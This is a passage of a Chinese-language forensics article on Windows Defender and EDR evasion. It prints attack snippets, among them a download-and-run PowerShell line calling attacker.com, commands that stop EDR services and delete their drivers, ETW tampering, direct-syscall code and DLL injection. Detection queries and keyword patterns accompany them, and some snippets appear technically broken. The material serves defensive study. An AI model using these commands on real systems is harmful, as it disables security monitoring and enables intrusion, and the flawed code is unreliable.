### PowerShell 内存执行绕过

**IEX + 下载执行**：

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

**.NET Assembly Load**：

```powershell
$data = (New-Object Net.WebClient).DownloadData('http://attacker.com/payload.exe')
$assembly = [System.Reflection.Assembly]::Load($data)
[Program.Main]::Invoke(@("arg1", "arg2"))
```

**Base64 编码执行**：

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base64_encoded_payload>
```

**PowerShell 内存执行的 Defender 检测**：

Defender 通过 AMSI 在 PowerShell 解混淆后扫描脚本内容。如果 AMSI 未被绕过，即使使用 Base64 编码，脚本在执行前仍会被扫描。这就是为什么攻击者在使用 PowerShell 执行恶意代码前必须先绕过 AMSI。

### 反射 DLL 加载绕过

反射 DLL 加载（Reflective DLL Loading）技术由 Stephen Fewer 在 2012 年提出，允许 DLL 不通过 Windows 加载器而是手动在内存中加载执行。

**工作原理**：

1. 将 DLL 文件通过网络传输或本地生成到内存缓冲区
2. 调用 DLL 入口点（通过 `GetProcAddress` 定位或硬编码偏移）
3. 手动执行 DLL 的重定位、导入表解析和 TLS 回调
4. 调用 DLL 的 `DllMain` 函数启动执行

**对 Defender 的绕过效果**：

- `LoadLibrary` 调用不会出现在进程的模块列表中
- 文件系统过滤器驱动（WdFilter.sys）无法拦截内存中的 DLL
- ETW-TI 仍然可以检测到内存分配和代码执行行为，但需要结合其他检测手段

### 不安全代码执行绕过

.NET 中的 `unsafe` 代码块和非托管代码调用为绕过 Defender 提供了更多攻击面：

**使用非托管代码执行**：

```powershell
$code = @"
using System;
using System.Runtime.InteropServices;
public class Bypass {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr addr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
}
"@
Add-Type -TypeDefinition $code
$addr = [Bypass]::VirtualAlloc([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

**PowerShell `Add-Type` 的 -TypeDefinition**：

通过 `-TypeDefinition` 参数定义 C# 类并调用非托管 API，可以在不创建文件的情况下执行任意代码。

### AMSI 绕过与 Defender 的关系

AMSI 是 Defender 扫描 PowerShell 脚本内容的关键接口。当 AMSI 被成功绕过时，Defender 对 PowerShell 执行的恶意代码将"失明"。

**AMSI 绕过后的 Defender 影响**：

- PowerShell 脚本内容不再被扫描
- 通过 PowerShell 执行的恶意代码不受 Defender 检测
- 但 Defender 的行为监控（Behavior Monitoring）和 ETW-TI 仍然可以检测到进程行为

**AMSI 绕过后的残留检测能力**：

Defender 即使在 AMSI 被绕过的情况下仍然保留部分检测能力：
- 文件系统层面：如果恶意代码最终写入磁盘，仍然可以被扫描
- 网络层面：恶意网络连接仍然可以被 Network Protection 拦截
- 行为层面：进程注入、注册表修改等行为仍可能被行为监控捕获

### 取证特征和检测方法

**内存中检测 AMSI 绕过**：

```powershell
$amsiModule = Get-Process | Where-Object { $_.Modules.FileName -match "amsi.dll" }
foreach ($proc in $amsiModule) {
    $proc.Modules | ForEach-Object {
        $hash = (Get-FileHash $_.FileName -Algorithm SHA256).Hash
        $expectedHash = "预期的amsi.dll哈希值"
        if ($hash -ne $expectedHash) {
            Write-Warning "进程 $($proc.ProcessName) (PID $($proc.Id)) 中的 amsi.dll 哈希不匹配"
        }
    }
}
```

**内存分配异常检测**：

```powershell
Get-Process | ForEach-Object {
    $proc = $_
    $memRegions = Get-Process -Id $proc.Id | Select-Object -ExpandProperty Modules
    if ($proc.MainModule.FileName -match "powershell") {
        Write-Host "PowerShell 进程 PID $($proc.Id): $($proc.MainModule.FileName)"
        Write-Host "  命令行: $($proc.StartInfo.Arguments)"
    }
}
```

**Sysmon 监控反射 DLL 加载**：

Sysmon Event ID 7（Image Loaded）可以监控 DLL 加载事件。如果某个 DLL 被加载但不在文件系统中（通过 `LoadedFrom` 字段判断），则可能是反射加载。

---

## 0x06 Defender 绕过 — 混淆与打包技术

### PowerShell 脚本混淆

PowerShell 脚本混淆是绕过 Defender 签名扫描和启发式检测的最常用技术。

**字符串拼接**：

```powershell
$a = "Inv"; $b = "oke-"; $c = "Ex"; $d = "pression"
$cmd = $a + $b + $c + $d
& $cmd "恶意代码"
```

**Base64 编码**：

```powershell
$encoded = "SW52b2tlLUV4cHJlc3Npb24gJ2NvbnNvbGUuV3JpdGVMaW5lKCdIZWxsbyBXb3JsZCknKQ=="
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
```

**字符替换/格式化**：

```powershell
$code = ('{4}{3}{2}{1}{0}' -f 'ession','-Expr','voke-In','x','I')
$code.Invoke('恶意代码')
```

**反转字符串**：

```powershell
$reversed = 'noisserpxE-ekovnI'
$forward = ($reversed[-1..-($reversed.Length)] -join '')
Invoke-Expression $forward
```

**变量间接引用**：

```powershell
${V} = 'IEX'
${W} = 'Write-Output'
${X} = 'hello'
& ${V} (& ${W} ${X})
```

### .NET 程序集混淆

**C# 混淆技术**：

攻击者使用专门的混淆工具（如 ConfuserEx、Dotfuscator、.NET Reactor）对 C# 程序集进行混淆：

- **控制流扁平化**：将正常的 if/else/for 结构转换为 switch-case 状态机
- **字符串加密**：将明文字符串加密存储，运行时解密
- **名称混淆**：将类名、方法名、字段名替换为不可读的字符
- **引用隐藏**：隐藏对 System.Reflection API 的调用
- **反调试检查**：添加调试器检测代码

### 打包器和加密器

恶意软件打包器（Packer）将原始可执行文件压缩/加密后包装为新的可执行文件，运行时在内存中解压执行。

**常见打包器**：

| 打包器 | 特征 |
|---|---|
| UPX | 开源，头部特征明显，Defender 有专门的解包检测 |
| Themida/WinLicense | 商业保护，虚拟化代码执行 |
| VMProtect | 虚拟机保护，代码在自定义虚拟机中执行 |
| Obsidium | 混淆+压缩+反调试 |
| AutoIT | 将脚本编译为可执行文件 |

**加密器（Crypter）**：

加密器使用 AES/RC4/XOR 等算法加密原始载荷，运行时在内存中解密执行。常见的加密器分为：

- **FUD（Fully UnDetectable）加密器**：声称能绕过所有 AV，通常效果有限
- **Stub 加密器**：使用一个解密 Stub + 加密的 Payload 模式
- **运行时加密器**：在运行时动态解密代码块

### 自定义加载器

自定义加载器（Loader）是一种专门设计用于加载和执行恶意载荷的程序：

**加载器的工作流程**：

1. 从网络下载或读取加密的载荷
2. 在内存中分配可执行内存区域
3. 解密载荷数据
4. 手动映射 PE 文件到内存中（重定位、解析导入表）
5. 创建线程执行载荷

**对 Defender 的规避效果**：

- 自定义加载器本身可能不包含已知恶意特征
- 载荷在内存中解密后执行，磁盘上只有加密的数据
- 如果加载器使用了 Direct Syscall，可以绕过用户态 Hook

### 取证特征（Event ID 1116/1117 检测日志）

**检测事件中的混淆特征**：

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1116</EventID>
    <Version>0</Version>
    <Level>2</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000001</Keywords>
    <TimeCreated SystemTime="2026-06-26T07:00:00.0000000Z" />
    <EventRecordID>45800</EventRecordID>
    <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="Product Name">Microsoft Defender Antivirus</Data>
    <Data Name="Product Version">4.18.2606.5</Data>
    <Data Name="Detection ID">{B2C3D4E5-F6A7-8901-CDEF-123456789ABC}</Data>
    <Data Name="Detection Time">2026-06-26T07:00:00.000Z</Data>
    <Data Name="Threat ID">2147825006</Data>
    <Data Name="Threat Name">HackTool:PowerShell/KillAV.A</Data>
    <Data Name="Severity">Severe</Data>
    <Data Name="Category">HackTool</Data>
    <Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020</Data>
    <Data Name="Path Type">LocalDrive</Data>
    <Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="Action">已阻止</Data>
  </EventData>
</Event>
```

**混淆相关的 Defender 检测命名模式**：

Defender 对检测到的威胁使用特定的命名约定，可以从中推断绕过技术：

| Threat Name 模式 | 含义 |
|---|---|
| `Trojan:Script/Obfus*.A!ml` | 启发式检测到的混淆脚本 |
| `Packer:Win32/*` | 检测到打包器 |
| `HackTool:PowerShell/*` | PowerShell 攻击工具 |
| `Trojan:Win32/Obfus*.A` | .NET 混淆木马 |
| `Trojan:Win64/ShellCodeRunner.A` | Shellcode 加载器 |
| `Behavior:Win32/*` | 行为检测到的威胁 |

### 检测方法

**Defender 日志中搜索混淆指标**：

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 1116, 1117
} -MaxEvents 500 | Where-Object {
    $_.Message -match "Obfus|Packer|EncodedCommand|HackTool|ShellCodeRunner|RefLoad"
} | Format-Table TimeCreated, Message -Wrap
```

**脚本块日志分析**：

```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-PowerShell/Operational'
    Id = 4104
} -MaxEvents 1000 | Where-Object {
    $_.Message -match "FromBase64String|Invoke-Expression|IEX|VirtualAlloc|CreateThread"
} | Format-Table TimeCreated, Message -Wrap
```

---

## 0x07 EDR 产品架构与工作原理

### EDR 的核心功能

EDR（Endpoint Detection and Response）是传统端点防护（EPP/AV）的进化形态。如果说 AV 是"门卫"（只负责拦截已知威胁），那么 EDR 就是"监控中心+调查员"（记录所有行为、检测异常、支持调查和响应）。

**核心功能矩阵**：

1. **数据收集（Data Collection）**：持续收集端点上的进程、文件、注册表、网络、用户行为等遥测数据
2. **检测（Detection）**：基于规则、行为分析、机器学习和威胁情报进行实时检测
3. **响应（Response）**：支持远程隔离、进程终止、文件隔离、脚本执行等响应操作
4. **调查（Investigation）**：提供时间线视图、因果关系图、行为分析等调查工具

### EDR 的技术实现

**内核驱动（Kernel Driver）**：

主流 EDR 产品都部署内核驱动以获取最高级别的系统可见性：
- **文件系统过滤器驱动**：拦截所有文件 I/O 操作（创建、读取、写入、删除）
- **进程过滤器驱动（PsSetCreateProcessNotifyRoutine）**：监控进程创建和终止
- **注册表过滤器驱动（CmRegisterCallback）**：监控注册表操作
- **网络过滤器驱动（WFP Callout Driver）**：拦截和分析网络流量
- **对象管理器回调（ObRegisterCallbacks）**：监控进程/线程句柄操作

**用户态 Hook（User-Mode Hooking）**：

EDR 在用户态进程中注入 Hook 函数以监控 API 调用：
- **IAT Hook（导入地址表 Hook）**：修改 PE 文件的导入地址表，将 API 调用重定向到 EDR 监控函数
- **Inline Hook**：修改 API 函数的前几个字节为跳转指令，重定向到 EDR 监控代码
- **ETW 钩子**：拦截 ETW 事件的产生和传递

**ETW 增强**：

EDR 产品通过 ETW 收集大量行为数据：
- **Microsoft-Windows-Threat-Intelligence ETW Provider**：内核级内存操作监控
- **Microsoft-Windows-Kernel-Process ETW Provider**：进程生命周期事件
- **Microsoft-Windows-Kernel-Network ETW Provider**：网络连接事件
- **Microsoft-Windows-Kernel-Registry ETW Provider**：注册表操作事件

**过滤器驱动（Filter Driver）**：

EDR 使用 Windows 过滤器管理器（Filter Manager）框架挂载过滤器驱动，能够拦截和修改底层驱动的 I/O 请求：
- 文件操作拦截
- 注册表操作拦截
- 进程/线程操作拦截
- 对象命名空间监控

### 主流 EDR 产品架构

**CrowdStrike Falcon**：

- **Falcon Sensor**：轻量级传感器，主要通过 ETW 和回调函数收集数据
- **Falcon Driver**：内核驱动 `csagent.sys`，提供深度系统可见性
- **Falcon OverWatch**：人工威胁狩猎服务
- **检测架构**：基于 IoA（Indicators of Attack）的行为检测，而非 IoC（Indicators of Compromise）的签名检测
- **日志格式**：JSON 格式遥测数据，通过 HTTPS 上传到 CrowdStrike 云端

**Carbon Black（VMware）**：

- **Cb Response**：基于记录器（Recorder）架构，记录所有进程行为
- **Cb Defense**：基于流（Streaming）架构的检测引擎
- **内核驱动**：`cbstream.sys` 提供内核级行为记录
- **检测方式**：行为观察 + 威胁情报 + 机器学习

**SentinelOne**：

- **Singularity Agent**：轻量级代理，支持 AI 驱动的检测
- **Deep Visibility**：行为数据引擎，基于 ETW 和回调函数
- **Storyline**：自动构建攻击行为链的因果关系图
- **内核驱动**：`SentinelMonitor.sys` 提供内核级监控

**Microsoft Defender for Endpoint（MDE）**：

- **SenseIR/SenseCncProxy**：端点传感器组件
- **EDR 模式**：在 Defender 基础上增加行为遥测数据上传
- **内核组件**：`WdFilter.sys` + `WdNisDrv.sys` + `SenseIR.sys`
- **检测架构**：基于行为检测 + 机器学习 + 威胁情报 + 云分析
- **日志格式**：设备事件通过 Microsoft 365 Defender 连接器上传

### EDR 日志格式和收集机制

**日志传输方式**：

| 产品 | 传输方式 | 日志格式 |
|---|---|---|
| CrowdStrike Falcon | HTTPS 云端上传 | JSON |
| Carbon Black | 本地日志 + 服务器收集 | CBF/JSON |
| SentinelOne | HTTPS 云端上传 | JSON |
| MDE | HTTPS + MDE Connector | JSON/CEF |

**日志存储位置**：

- CrowdStrike：云端控制台 + Falcon LogScale
- Carbon Black：本地数据库 + CB Response 服务器
- SentinelOne：云端控制台 + 深度可见性引擎
- MDE：Microsoft 365 Defender 门户 + Sentinel

---

## 0x08 EDR 绕过技术

### 内核驱动级别的对抗

内核级绕过是 EDR 绕过的最高层级，直接对抗 EDR 的数据收集管道。

**禁用 EDR 内核驱动**：

```cmd
sc stop <EDR_Service>
sc config <EDR_Service> start= disabled
```

**删除或重命名 EDR 驱动文件**：

```cmd
del /f "C:\Program Files\CrowdStrike\csagent.sys"
ren "C:\Program Files\CrowdStrike\csagent.sys" csagent.sys.bak
```

**利用驱动漏洞加载恶意驱动**：

攻击者可能利用已知的 BYOVD（Bring Your Own Vulnerable Driver）漏洞加载带有内核级权限的恶意驱动，然后卸载或禁用 EDR 的内核驱动。

常见被利用的漏洞驱动：
- `gdrv.sys`（GIGABYTE）— CVE-2018-19320
- `RTCore64.sys`（MSI Afterburner）— 多个 CVE
- `DBUtil_2_3.sys`（Dell）— CVE-2021-21551
- `procexp.sys`（Sysinternals）— 被用于获取内核权限

### ETW 钩子移除

ETW（Event Tracing for Windows）是 EDR 收集行为数据的主要管道之一。通过阻止 ETW 事件的产生或传递，可以使 EDR 丢失关键的行为数据。

**EtwEventWrite 补丁**：

```powershell
$etwFunc = (Get-Process -Name "ntdll").Modules[0].BaseAddress
$etwPatch = [System.Runtime.InteropServices.Marshal]::ReadByte((Get-ProcAddress ntdll.dll EtwEventWrite))
```

**禁用 ETW Provider**：

```powershell
$provider = [System.Diagnostics.Eventing.EventProvider]
$guid = [Guid]"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
# 通过关闭 ETW Logger Session 禁用 Provider
logman stop "EventLog-Microsoft-Windows-PowerShell-Operational" -ets
```

**修改 ETW Session 配置**：

```cmd
logman query "NT Kernel Logger"
logman update "NT Kernel Logger" -p 0 0x0 0x0
```

### 用户态 Hook 绕过

EDR 在用户态进程中安装的 Hook 是最容易被绕过的，因为用户态代码的控制权最终属于进程本身。

**直接系统调用（Direct Syscall）**：

EDR Hook 通常拦截 ntdll.dll 的导出函数。通过直接调用系统调用号（syscall number），可以绕过用户态 Hook：

```c
#include <windows.h>

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

void SyscallBypass() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocMem = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    
    BYTE* syscallAddr = (BYTE*)NtAllocMem;
    while (*syscallAddr != 0x0f || *(syscallAddr + 1) != 0x05) {
        syscallAddr++;
    }
    // syscallAddr 现在指向实际的 syscall 指令
}
```

**Hell's Gate 技术**：

Hell's Gate 是一种从 ntdll.dll 动态解析系统调用号的技术：

```python
import struct

def get_syscall_number(function_name):
    ntdll = ctypes.windll.ntdll
    func_addr = ctypes.cast(getattr(ntdll, function_name), ctypes.c_void_p).value
    
    for offset in range(0, 0x20):
        if struct.unpack('B', ctypes.string_at(func_addr + offset, 1))[0] == 0x0f:
            if struct.unpack('B', ctypes.string_at(func_addr + offset + 1, 1))[0] == 0x05:
                syscall_num = struct.unpack('<H', ctypes.string_at(func_addr + offset - 2, 2))[0]
                return syscall_num
    return None
```

**Halo's Gate 技术**：

Halo's Gate 在 Hell's Gate 基础上改进，通过已知的系统调用（如 NtAllocateVirtualMemory）定位相邻的未知系统调用号。

**SysWhispers 技术**：

SysWhispers 直接内联系统调用汇编代码，完全不通过 ntdll.dll：

```asm
NtAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h        ; Syscall number
    syscall
    ret
NtAllocateVirtualMemory endp
```

### 进程注入到受信任进程

通过将恶意代码注入到受信任的系统进程中，可以利用 EDR 对系统进程的信任降低检测概率。

**DLL 注入**：

```c
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID mem = VirtualAllocEx(hProc, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProc, mem, dllPath, strlen(dllPath), NULL);
CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), mem, 0, NULL);
```

**进程镂空（Process Hollowing）**：

1. 创建目标进程的挂起版本（如 `svchost.exe`）
2. 使用 `NtUnmapViewOfSection` 取消映射原始内存
3. 使用 `VirtualAllocEx` 在新进程中分配内存
4. 使用 `WriteProcessMemory` 写入恶意代码
5. 使用 `SetThreadContext` 修改线程上下文指向新代码
6. 使用 `ResumeThread` 恢复线程执行

**进程 Doppelgänging（跨进程投影）**：

利用 NTFS 事务和进程创建的竞态条件，在进程创建过程中替换其内存内容。

### 手动映射（Manual Mapping）

手动映射是反射 DLL 加载的高级形式，完全不使用 Windows 加载器：

**工作流程**：

1. 分配可执行内存区域
2. 复制 PE 头和节区到内存
3. 处理重定位表（Base Relocation）
4. 解析和填充导入地址表（IAT）
5. 设置内存保护属性（RX/RWX）
6. 调用入口点或 TLS 回调

**对 EDR 的规避效果**：

- 不通过 `LoadLibrary` 加载，DLL 不出现在模块列表中
- 不触发文件系统过滤器驱动的加载事件
- ETW Module Load 事件可能缺失或异常
- EDR 的用户态 Hook 不会被安装到手动映射的 DLL 中

### 取证特征（系统调用异常、ETW 事件丢失、Hook 恢复）

**系统调用异常特征**：

- 进程的系统调用模式偏离正常基线（如 PowerShell 进程直接调用 NtAllocateVirtualMemory 而非通过 kernel32.dll）
- 异常的内存分配模式（如从可执行内存区域执行代码）
- 不匹配的返回地址栈

**ETW 事件丢失特征**：

- ETW Session 状态异常（已停止或配置被修改）
- 特定 Provider 的事件频率突然下降
- ETW 缓冲区溢出或丢弃事件增加
- 日志中出现 Event ID 50（EventLog-Security）的 Provider 禁用记录

**Hook 恢复特征**：

- 进程中的 ntdll.dll 函数前几个字节被修改
- IAT 指向非模块内存区域
- 异常的跳转指令出现在系统 DLL 的导出函数中

### 检测方法

**ETW Session 状态完整性监控**：

```powershell
logman query "NT Kernel Logger" -ets
logman query "EventLog-Security" -ets
logman query "EventLog-System" -ets
Get-WinEvent -ListLog * | Where-Object { $_.IsEnabled -eq $true } | Select-Object LogName, IsEnabled
```

**进程模块完整性检测**：

```powershell
Get-Process | ForEach-Object {
    $proc = $_
    try {
        $proc.Modules | ForEach-Object {
            $modulePath = $_.FileName
            if ($modulePath -and (Test-Path $modulePath)) {
                $expectedHash = (Get-FileHash $modulePath -Algorithm SHA256).Hash
            }
        }
    } catch {
        Write-Warning "无法读取进程 $($proc.ProcessName) (PID $($proc.Id)) 的模块信息"
    }
}
```

**Ntdll Hook 检测**：

```powershell
$ntdll = Get-Process -Name ntdll -ErrorAction SilentlyContinue
if ($ntdll) {
    $baseAddr = $ntdll.MainModule.BaseAddress
    $functions = @("NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx")
    foreach ($func in $functions) {
        $funcAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionDelegate(
            [IntPtr](Add-Type -MemberDefinition @"
            [DllImport("ntdll.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
"@ -Name "Kernel32" -Namespace "Win32" -PassThru)::GetModuleHandle("ntdll.dll"), $func)
        $firstBytes = New-Object byte[] 16
        [System.Runtime.InteropServices.Marshal]::Copy($funcAddr, $firstBytes, 0, 16)
        if ($firstBytes[0] -eq 0xE9 -or $firstBytes[0] -eq 0xFF -and $firstBytes[1] -eq 0x25) {
            Write-Warning "函数 $func 可能被 Hook"
        }
    }
}
```

---

## 0x09 安全产品日志关联分析

### Defender + Sysmon 联合分析

Windows Defender 和 Sysmon 是两个互补的安全数据源：Defender 提供恶意软件检测和防护事件，Sysmon 提供详细的行为监控事件。两者的日志关联可以提供更完整的攻击画面。

**Defender 检测 + Sysmon 进程创建关联**：

```kql
let defenderEvents = DeviceEvents
| where Timestamp between (ago(1h) .. now())
| where ActionType == "AntivirusDetection"
| extend DetectionTime = Timestamp, ThreatName = AdditionalFields
| project DetectionTime, DeviceName, FileName, ThreatName;
let sysmonProcessCreate = DeviceProcessEvents
| where Timestamp between (ago(1h) .. now())
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, InitiatingProcessId;
defenderEvents
| join kind=inner sysmonProcessCreate on DeviceName
| where abs(datetime_diff('second', DetectionTime, Timestamp)) < 10
| project DetectionTime, DeviceName, FileName, ThreatName, ProcessCommandLine, InitiatingProcessFileName
```

**Defender 保护事件 + Sysmon 网络连接关联**：

```kql
let defenderBlocked = DeviceEvents
| where ActionType in ("AntivirusBlocked", "ConnectionAllowedByAdmin")
| project Timestamp, DeviceName, FileName, RemoteIP;
let sysmonNetwork = DeviceNetworkEvents
| where Timestamp between (ago(1h) .. now())
| project Timestamp, DeviceName, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine;
defenderBlocked
| join kind=inner sysmonNetwork on DeviceName, RemoteIP
| project Timestamp=Timestamp, DeviceName, FileName, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
```

**PowerShell 攻击链重建**：

```kql
DeviceProcessEvents
| where Timestamp between (ago(24h) .. now())
| where FileName == "powershell.exe" or FileName == "pwsh.exe"
| where ProcessCommandLine has_any ("-EncodedCommand", "-enc", "-e", "IEX", "Invoke-Expression", "DownloadString", "DownloadData", "FromBase64String")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

### EDR + Windows 事件日志关联

**MDE 中的多数据源关联**：

```kql
let suspiciousEvents = DeviceEvents
| where ActionType in ("AntivirusDetection", "SuspiciousActivity", "ExploitProcessCreated")
| project DetectionsTime=Timestamp, DeviceName, FileName, Action=ActionType;
let loginEvents = DeviceLogonEvents
| where LogonType in ("Interactive", "RemoteInteractive", "Network")
| project LogonTime=Timestamp, DeviceName, AccountName, RemoteIP, LogonType;
let registryEvents = DeviceRegistryEvents
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| where RegistryKey has_any ("Windows Defender", "Real-Time Protection", "Exclusions")
| project RegistryTime=Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData;
suspiciousEvents
| join kind=leftouter loginEvents on DeviceName
| join kind=leftouter registryEvents on DeviceName
| sort by DetectionsTime asc
```

### 多产品日志时间线分析

**构建完整攻击时间线**：

```powershell
$timeline = @()

$timeline += Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 1116, 1117, 1118, 5007, 3001, 3002, 3004, 3007
} -MaxEvents 500 -ErrorAction SilentlyContinue | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        Source = 'Defender'
        EventId = $_.Id
        Detail = $_.Message.Substring(0, [Math]::Min(200, $_.Message.Length))
    }
}

$timeline += Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Sysmon/Operational'
    Id = 1, 3, 7, 8, 10, 11, 13, 25
} -MaxEvents 500 -ErrorAction SilentlyContinue | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        Source = 'Sysmon'
        EventId = $_.Id
        Detail = $_.Message.Substring(0, [Math]::Min(200, $_.Message.Length))
    }
}

$timeline += Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4624, 4625, 4648, 4672, 4688, 4697, 4698, 5001, 5010, 5140, 5156
} -MaxEvents 500 -ErrorAction SilentlyContinue | ForEach-Object {
    [PSCustomObject]@{
        Time = $_.TimeCreated
        Source = 'Security'
        EventId = $_.Id
        Detail = $_.Message.Substring(0, [Math]::Min(200, $_.Message.Length))
    }
}

$timeline | Sort-Object Time | Format-Table Time, Source, EventId, Detail -Wrap
```

### 日志缺失/延迟检测

日志缺失是 EDR 绕过的最直接证据之一。

**Defender 日志连续性检查**：

```powershell
$recentLogs = Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 1001, 1116
} -MaxEvents 50 -ErrorAction SilentlyContinue | Sort-Object TimeCreated
if ($recentLogs.Count -ge 2) {
    for ($i = 1; $i -lt $recentLogs.Count; $i++) {
        $gap = ($recentLogs[$i].TimeCreated - $recentLogs[$i-1].TimeCreated).TotalMinutes
        if ($gap -gt 60) {
            Write-Warning "检测到 Defender 日志空隙：$($recentLogs[$i-1].TimeCreated) 到 $($recentLogs[$i].TimeCreated) 间隔 $([int]$gap) 分钟"
        }
    }
}
```

**Sysmon 日志连续性检查**：

```powershell
$sysmonLogs = Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Sysmon/Operational'
} -MaxEvents 100 -ErrorAction SilentlyContinue | Sort-Object TimeCreated
if ($sysmonLogs.Count -ge 2) {
    for ($i = 1; $i -lt $sysmonLogs.Count; $i++) {
        $gap = ($sysmonLogs[$i].TimeCreated - $sysmonLogs[$i-1].TimeCreated).TotalMinutes
        if ($gap -gt 30) {
            Write-Warning "检测到 Sysmon 日志空隙：$($sysmonLogs[$i-1].TimeCreated) 到 $($sysmonLogs[$i].TimeCreated) 间隔 $([int]$gap) 分钟"
        }
    }
}
```

### 安全产品互信关系分析

**Defender 与 EDR 的协同防御**：

在企业环境中，通常会同时部署 Defender 和第三方 EDR（或 MDE）。两者的互信关系意味着：
- Defender 检测到的威胁会同步发送给 EDR 平台
- EDR 的检测结果可以通过 Microsoft 365 Defender Connector 反馈到 Defender
- 两者的日志可以进行交叉验证

**互信关系被破坏的特征**：

- Defender 检测事件突然减少但无扫描策略变更
- EDR 平台上的端点遥测数据出现缺失
- 两个产品的日志时间戳出现不一致
- 某一产品的事件 ID 频率突然下降

---

## 0x10 证据强度分层

### 确认恶意（Confirmation Level）

以下证据可以确认 Defender 或 EDR 绕过的恶意性：

| 证据类型 | 具体表现 |
|---|---|
| Event ID 5007 配置变更 | Defender 保护配置被修改为禁用状态 |
| Event ID 5001 实时保护关闭 | 实时保护被关闭，且无管理员操作记录 |
| 无用户交互的保护变更 | 保护配置变更发生在 SYSTEM 上下文或非交互式会话中 |
| 排除路径包含恶意文件 | 排除目录中发现已知恶意软件或可疑文件 |
| ETW Session 被停止 | 关键 ETW Session 被异常停止 |
| EDR 驱动被禁用/卸载 | EDR 内核驱动服务状态为停止或禁用 |
| 系统调用号异常 | 进程中发现 SysWhispers/Syscalls 等直接系统调用特征 |
| 内存中发现反射加载的 DLL | 进程内存中发现未从文件系统加载的 PE 映像 |

### 高度可疑（High Suspicion Level）

以下证据指示高度可疑的 Defender/EDR 绕过行为：

| 证据类型 | 具体表现 |
|---|---|
| 保护状态变更时间异常 | 保护配置变更发生在非工作时间或节假日期间 |
| PowerShell 执行后立即关闭保护 | PowerShell 命令执行与保护关闭之间时间差 < 5 秒 |
| 注册表审计日志中的异常修改 | Event ID 4657 显示 Defender 注册表被非授权修改 |
| 异常的 ETW Provider 配置 | 关键 ETW Provider 被禁用或配置变更 |
| 进程注入到系统进程 | 非系统进程被注入到 csrss.exe、svchost.exe 等 |
| 异常的网络连接 | EDR 传感器与管理服务器的通信中断 |
| 反调试检测代码 | 进程中发现调试器检测逻辑 |

### 需要关注（Attention Level）

以下证据需要进一步调查以确定恶意性：

| 证据类型 | 具体表现 |
|---|---|
| Defender 排除列表变更 | 新增排除路径但尚未确认是否为管理员操作 |
| 日志时间戳不一致 | 安全日志时间戳与系统时间存在偏差 |
| 异常的服务启动/停止 | Windows 服务（包括安全服务）在非预期时间启动或停止 |
| 未签名的内核驱动加载 | 非 Microsoft/非已知厂商签名的驱动被加载 |
| 异常的计划任务 | 新增或修改的计划任务指向可疑路径或命令 |
| Defender 版本异常 | Defender 引擎版本显著落后于环境基线 |

---

## 0x11 公开案例中的 Defender/EDR 绕过

### 案例一：APT29 — Defender 策略篡改 + AMSI 绕过

**攻击背景**：

APT29（Cozy Bear / NOBELIUM）是与俄罗斯情报机构关联的高级持续性威胁组织。在 SolarWinds 供应链攻击（2020）及后续攻击活动中，APT29 多次使用 Defender 绕过技术。

**攻击手法分析**：

1. **初始访问**：通过供应链攻击或钓鱼邮件获取初始立足点
